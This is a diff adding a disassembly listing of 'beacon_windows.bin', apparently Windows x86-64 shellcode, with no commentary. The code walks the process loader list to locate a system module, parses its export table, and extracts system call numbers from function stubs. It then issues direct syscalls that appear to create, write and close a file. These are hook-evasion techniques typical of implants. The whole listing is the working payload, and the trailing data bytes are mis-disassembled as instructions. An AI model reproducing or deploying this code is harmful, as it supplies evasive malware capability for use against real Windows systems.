@@ -1,0 +1,376 @@
+# beacon_windows.bin — 1560 bytes, x86-64, intel syntax
+0x0000:  push rax
+0x0001:  push rcx
+0x0002:  push rdx
+0x0003:  push rbx
+0x0004:  push rsi
+0x0005:  push rdi
+0x0006:  push rbp
+0x0007:  push r8
+0x0009:  push r9
+0x000b:  push r10
+0x000d:  push r11
+0x000f:  push r12
+0x0011:  push r13
+0x0013:  push r14
+0x0015:  push r15
+0x0017:  call 0x1c
+0x001c:  pop r12
+0x001e:  xor rax, rax
+0x0021:  mov qword ptr [r12 + 0x4b8], rax
+0x0029:  not rax
+0x002c:  mov qword ptr [r12 + 0x5f4], rax
+0x0034:  mov rax, qword ptr gs:[0x60]
+0x003d:  mov rax, qword ptr [rax + 0x18]
+0x0041:  lea r14, [rax + 0x10]
+0x0045:  mov r13, qword ptr [r14]
+0x0048:  mov rsi, qword ptr [r13 + 0x60]
+0x004c:  movzx rdx, word ptr [r13 + 0x58]
+0x0051:  shr rdx, 1
+0x0054:  lea r8, [r12 + 0x581]
+0x005c:  mov r9d, 9
+0x0062:  call 0x3d0
+0x0067:  test rax, rax
+0x006a:  je 0x7a
+0x006c:  mov rax, qword ptr [r13 + 0x30]
+0x0070:  mov qword ptr [r12 + 0x4b8], rax
+0x0078:  jmp 0x7a
+0x007a:  mov r13, qword ptr [r13]
+0x007e:  cmp r13, r14
+0x0081:  je 0x85
+0x0083:  jmp 0x48
+0x0085:  cmp qword ptr [r12 + 0x4b8], 0
+0x008e:  jne 0x95
+0x0090:  jmp 0x36a
+0x0095:  mov r11, qword ptr [r12 + 0x4b8]
+0x009d:  mov r10d, dword ptr [r11 + 0x3c]
+0x00a1:  lea r10, [r11 + r10]
+0x00a5:  lea r10, [r10 + 0x18]
+0x00a9:  mov r11d, dword ptr [r10 + 0x70]
+0x00ad:  add r11, qword ptr [r12 + 0x4b8]
+0x00b5:  mov r10d, dword ptr [r11 + 0x18]
+0x00b9:  mov qword ptr [r12 + 0x4d8], r10
+0x00c1:  mov r9d, dword ptr [r11 + 0x1c]
+0x00c5:  mov r10, qword ptr [r12 + 0x4b8]
+0x00cd:  add r10, r9
+0x00d0:  mov qword ptr [r12 + 0x4c0], r10
+0x00d8:  mov r9d, dword ptr [r11 + 0x20]
+0x00dc:  mov r10, qword ptr [r12 + 0x4b8]
+0x00e4:  add r10, r9
+0x00e7:  mov qword ptr [r12 + 0x4c8], r10
+0x00ef:  mov r9d, dword ptr [r11 + 0x24]
+0x00f3:  mov r10, qword ptr [r12 + 0x4b8]
+0x00fb:  add r10, r9
+0x00fe:  mov qword ptr [r12 + 0x4d0], r10
+0x0106:  lea rsi, [r12 + 0x560]
+0x010e:  mov edx, 0xb
+0x0113:  call 0x457
+0x0118:  mov qword ptr [r12 + 0x4e0], rax
+0x0120:  test rax, rax
+0x0123:  je 0x36a
+0x0129:  mov rsi, rax
+0x012c:  call 0x41e
+0x0131:  mov qword ptr [r12 + 0x4f0], rax
+0x0139:  mov rax, qword ptr gs:[0x60]
+0x0142:  mov rax, qword ptr [rax + 0x20]
+0x0146:  mov rax, qword ptr [rax + 0x28]
+0x014a:  mov qword ptr [r12 + 0x4e8], rax
+0x0152:  sub rsp, 0x58
+0x0156:  lea r9, [r12 + 0x4a8]
+0x015e:  mov qword ptr [rsp + 0x28], r9
+0x0163:  lea r9, [r12 + 0x5bf]
+0x016b:  mov qword ptr [rsp + 0x30], r9
+0x0170:  mov dword ptr [rsp + 0x38], 0x35
+0x0178:  mov r9d, 0
+0x017e:  mov qword ptr [rsp + 0x40], r9
+0x0183:  mov qword ptr [rsp + 0x48], r9
+0x0188:  mov rcx, qword ptr [r12 + 0x4e8]
+0x0190:  mov r10, rcx
+0x0193:  xor rdx, rdx
+0x0196:  xor r8d, r8d
+0x0199:  mov eax, dword ptr [r12 + 0x4f0]
+0x01a1:  syscall
+0x01a3:  add rsp, 0x58
+0x01a7:  lea rsi, [r12 + 0x56c]
+0x01af:  mov edx, 0xc
+0x01b4:  call 0x457
+0x01b9:  mov qword ptr [r12 + 0x4f8], rax
+0x01c1:  test rax, rax
+0x01c4:  je 0x36a
+0x01ca:  mov rsi, rax
+0x01cd:  call 0x41e
+0x01d2:  mov qword ptr [r12 + 0x508], rax
+0x01da:  lea rsi, [r12 + 0x579]
+0x01e2:  mov edx, 7
+0x01e7:  call 0x457
+0x01ec:  mov qword ptr [r12 + 0x500], rax
+0x01f4:  test rax, rax
+0x01f7:  je 0x36a
+0x01fd:  mov rsi, rax
+0x0200:  call 0x41e
+0x0205:  mov qword ptr [r12 + 0x510], rax
+0x020d:  mov word ptr [r12 + 0x520], 0x2a
+0x0218:  mov word ptr [r12 + 0x522], 0x2c
+0x0223:  lea rax, [r12 + 0x593]
+0x022b:  mov qword ptr [r12 + 0x528], rax
+0x0233:  mov dword ptr [r12 + 0x530], 0x30
+0x023f:  lea rax, [r12 + 0x520]
+0x0247:  mov qword ptr [r12 + 0x540], rax
+0x024f:  mov dword ptr [r12 + 0x548], 0x40
+0x025b:  xor rax, rax
+0x025e:  mov qword ptr [r12 + 0x518], rax
+0x0266:  sub rsp, 0x68
+0x026a:  lea rax, [r12 + 0x518]
+0x0272:  mov rcx, rax
+0x0275:  mov r10, rcx
+0x0278:  mov edx, 0x12019f
+0x027d:  lea r8, [r12 + 0x530]
+0x0285:  lea r9, [r12 + 0x4a8]
+0x028d:  mov qword ptr [rsp + 0x28], 0
+0x0296:  mov qword ptr [rsp + 0x30], 0x80
+0x029f:  mov qword ptr [rsp + 0x38], 7
+0x02a8:  mov qword ptr [rsp + 0x40], 2
+0x02b1:  mov qword ptr [rsp + 0x48], 0x42
+0x02ba:  mov qword ptr [rsp + 0x50], 0
+0x02c3:  mov qword ptr [rsp + 0x58], 0
+0x02cc:  mov qword ptr [rsp + 0x60], 0
+0x02d5:  mov eax, dword ptr [r12 + 0x508]
+0x02dd:  syscall
+0x02df:  mov qword ptr [r12 + 0x5f4], rax
+0x02e7:  add rsp, 0x68
+0x02eb:  mov rax, qword ptr [r12 + 0x518]
+0x02f3:  test rax, rax
+0x02f6:  je 0x36a
+0x02f8:  sub rsp, 0x58
+0x02fc:  lea r9, [r12 + 0x4a8]
+0x0304:  mov qword ptr [rsp + 0x28], r9
+0x0309:  lea r9, [r12 + 0x5bf]
+0x0311:  mov qword ptr [rsp + 0x30], r9
+0x0316:  mov dword ptr [rsp + 0x38], 0x35
+0x031e:  mov r9d, 0
+0x0324:  mov qword ptr [rsp + 0x40], r9
+0x0329:  mov qword ptr [rsp + 0x48], r9
+0x032e:  mov rcx, qword ptr [r12 + 0x518]
+0x0336:  mov r10, rcx
+0x0339:  xor rdx, rdx
+0x033c:  xor r8d, r8d
+0x033f:  mov eax, dword ptr [r12 + 0x4f0]
+0x0347:  syscall
+0x0349:  add rsp, 0x58
+0x034d:  sub rsp, 8
+0x0351:  mov rcx, qword ptr [r12 + 0x518]
+0x0359:  mov r10, rcx
+0x035c:  mov eax, dword ptr [r12 + 0x510]
+0x0364:  syscall
+0x0366:  add rsp, 8
+0x036a:  pop r15
+0x036c:  pop r14
+0x036e:  pop r13
+0x0370:  pop r12
+0x0372:  pop r11
+0x0374:  pop r10
+0x0376:  pop r9
+0x0378:  pop r8
+0x037a:  pop rbp
+0x037b:  pop rdi
+0x037c:  pop rsi
+0x037d:  pop rbx
+0x037e:  pop rdx
+0x037f:  pop rcx
+0x0380:  pop rax
+0x0381:  ret
+0x0382:  cmp rdx, r9
+0x0385:  jne 0x3cd
+0x0387:  mov r10d, 0
+0x038d:  movzx r11, byte ptr [rsi + r10]
+0x0392:  movzx rax, byte ptr [r8 + r10]
+0x0397:  cmp r11, 0x41
+0x039b:  jb 0x3a7
+0x039d:  cmp r11, 0x5a
+0x03a1:  ja 0x3a7
+0x03a3:  add r11, 0x20
+0x03a7:  cmp rax, 0x41
+0x03ab:  jb 0x3b7
+0x03ad:  cmp rax, 0x5a
+0x03b1:  ja 0x3b7
+0x03b3:  add rax, 0x20
+0x03b7:  cmp r11, rax
+0x03ba:  jne 0x3ca
+0x03bc:  inc r10
+0x03bf:  cmp r10, rdx
+0x03c2:  jb 0x38d
+0x03c4:  mov eax, 1
+0x03c9:  ret
+0x03ca:  xor eax, eax
+0x03cc:  ret
+0x03cd:  xor eax, eax
+0x03cf:  ret
+0x03d0:  cmp rdx, r9
+0x03d3:  jne 0x41b
+0x03d5:  mov r10d, 0
+0x03db:  movzx r11, word ptr [rsi + r10*2]
+0x03e0:  movzx rax, word ptr [r8 + r10*2]
+0x03e5:  cmp r11, 0x41
+0x03e9:  jb 0x3f5
+0x03eb:  cmp r11, 0x5a
+0x03ef:  ja 0x3f5
+0x03f1:  add r11, 0x20
+0x03f5:  cmp rax, 0x41
+0x03f9:  jb 0x405
+0x03fb:  cmp rax, 0x5a
+0x03ff:  ja 0x405
+0x0401:  add rax, 0x20
+0x0405:  cmp r11, rax
+0x0408:  jne 0x418
+0x040a:  inc r10
+0x040d:  cmp r10, rdx
+0x0410:  jb 0x3db
+0x0412:  mov eax, 1
+0x0417:  ret
+0x0418:  xor eax, eax
+0x041a:  ret
+0x041b:  xor eax, eax
+0x041d:  ret
+0x041e:  xor r10, r10
+0x0421:  cmp byte ptr [rsi + r10], 0x48
+0x0426:  je 0x43b
+0x0428:  cmp byte ptr [rsi + r10], 0xb8
+0x042d:  je 0x451
+0x042f:  inc r10
+0x0432:  cmp r10, 0x18
+0x0436:  jb 0x421
+0x0438:  xor eax, eax
+0x043a:  ret
+0x043b:  cmp byte ptr [rsi + r10 + 1], 0xc7
+0x0441:  jne 0x42f
+0x0443:  cmp byte ptr [rsi + r10 + 2], 0xc0
+0x0449:  jne 0x42f
+0x044b:  mov eax, dword ptr [rsi + r10 + 3]
+0x0450:  ret
+0x0451:  mov eax, dword ptr [rsi + r10 + 1]
+0x0456:  ret
+0x0457:  push rbx
+0x0458:  xor rbx, rbx
+0x045b:  cmp rbx, qword ptr [r12 + 0x4d8]
+0x0463:  jae 0x4c0
+0x0465:  mov r8, qword ptr [r12 + 0x4c8]
+0x046d:  mov r8d, dword ptr [r8 + rbx*4]
+0x0471:  add r8, qword ptr [r12 + 0x4b8]
+0x0479:  xor r10, r10
+0x047c:  movzx r11, byte ptr [r8 + r10]
+0x0481:  test r11, r11
+0x0484:  je 0x48b
+0x0486:  inc r10
+0x0489:  jmp 0x47c
+0x048b:  mov r9, r10
+0x048e:  call 0x382
+0x0493:  test rax, rax
+0x0496:  je 0x4bb
+0x0498:  mov r9, qword ptr [r12 + 0x4d0]
+0x04a0:  movzx r10, word ptr [r9 + rbx*2]
+0x04a5:  mov r9, qword ptr [r12 + 0x4c0]
+0x04ad:  mov eax, dword ptr [r9 + r10*4]
+0x04b1:  add rax, qword ptr [r12 + 0x4b8]
+0x04b9:  pop rbx
+0x04ba:  ret
+0x04bb:  inc rbx
+0x04be:  jmp 0x45b
+0x04c0:  pop rbx
+0x04c1:  xor eax, eax
+0x04c3:  ret
+0x04c4:  add byte ptr [rax], al
+0x04c6:  add byte ptr [rax], al
+0x04c8:  add byte ptr [rax], al
+0x04ca:  add byte ptr [rax], al
+0x04cc:  add byte ptr [rax], al
+0x04ce:  add byte ptr [rax], al
+0x04d0:  add byte ptr [rax], al
+0x04d2:  add byte ptr [rax], al
+0x04d4:  add byte ptr [rax], al
+0x04d6:  add byte ptr [rax], al
+0x04d8:  add byte ptr [rax], al
+0x04da:  add byte ptr [rax], al
+0x04dc:  add byte ptr [rax], al
+0x04de:  add byte ptr [rax], al
+0x04e0:  add byte ptr [rax], al
+0x04e2:  add byte ptr [rax], al
+0x04e4:  add byte ptr [rax], al
+0x04e6:  add byte ptr [rax], al
+0x04e8:  add byte ptr [rax], al
+0x04ea:  add byte ptr [rax], al
+0x04ec:  add byte ptr [rax], al
+0x04ee:  add byte ptr [rax], al
+0x04f0:  add byte ptr [rax], al
+0x04f2:  add byte ptr [rax], al
+0x04f4:  add byte ptr [rax], al
+0x04f6:  add byte ptr [rax], al
+0x04f8:  add byte ptr [rax], al
+0x04fa:  add byte ptr [rax], al
+0x04fc:  add byte ptr [rax], al
+0x04fe:  add byte ptr [rax], al
+0x0500:  add byte ptr [rax], al
+0x0502:  add byte ptr [rax], al
+0x0504:  add byte ptr [rax], al
+0x0506:  add byte ptr [rax], al
+0x0508:  add byte ptr [rax], al
+0x050a:  add byte ptr [rax], al
+0x050c:  add byte ptr [rax], al
+0x050e:  add byte ptr [rax], al
+0x0510:  add byte ptr [rax], al
+0x0512:  add byte ptr [rax], al
+0x0514:  add byte ptr [rax], al
+0x0516:  add byte ptr [rax], al
+0x0518:  add byte ptr [rax], al
+0x051a:  add byte ptr [rax], al
+0x051c:  add byte ptr [rax], al
+0x051e:  add byte ptr [rax], al
+0x0520:  add byte ptr [rax], al
+0x0522:  add byte ptr [rax], al
+0x0524:  add byte ptr [rax], al
+0x0526:  add byte ptr [rax], al
+0x0528:  add byte ptr [rax], al
+0x052a:  add byte ptr [rax], al
+0x052c:  add byte ptr [rax], al
+0x052e:  add byte ptr [rax], al
+0x0530:  add byte ptr [rax], al
+0x0532:  add byte ptr [rax], al
+0x0534:  add byte ptr [rax], al
+0x0536:  add byte ptr [rax], al
+0x0538:  add byte ptr [rax], al
+0x053a:  add byte ptr [rax], al
+0x053c:  add byte ptr [rax], al
+0x053e:  add byte ptr [rax], al
+0x0540:  add byte ptr [rax], al
+0x0542:  add byte ptr [rax], al
+0x0544:  add byte ptr [rax], al
+0x0546:  add byte ptr [rax], al
+0x0548:  add byte ptr [rax], al
+0x054a:  add byte ptr [rax], al
+0x054c:  add byte ptr [rax], al
+0x054e:  add byte ptr [rax], al
+0x0550:  add byte ptr [rax], al
+0x0552:  add byte ptr [rax], al
+0x0554:  add byte ptr [rax], al
+0x0556:  add byte ptr [rax], al
+0x0558:  add byte ptr [rax], al
+0x055a:  add byte ptr [rax], al
+0x055c:  add byte ptr [rax], al
+0x055e:  add byte ptr [rax], al
+0x0560:  add byte ptr [rax], al
+0x0562:  add byte ptr [rax], al
+0x0564:  add byte ptr [rax], al
+0x0566:  add byte ptr [rax], al
+0x0568:  add byte ptr [rax], al
+0x056a:  add byte ptr [rax], al
+0x056c:  add byte ptr [rax], al
+0x056e:  add byte ptr [rax], al
+0x0570:  add byte ptr [rax], al
+0x0572:  add byte ptr [rax], al
+0x0574:  add byte ptr [rax], al
+0x0576:  add byte ptr [rax], al
+0x0578:  add byte ptr [rax], al
+0x057a:  add byte ptr [rax], al
+0x057c:  je 0x5d6
+0x057f:  jb 0x5ea
+0x0581:  je 0x5e8
+0x0583:  imul r13d, dword ptr [rbp + r12*2], 0x7243744e
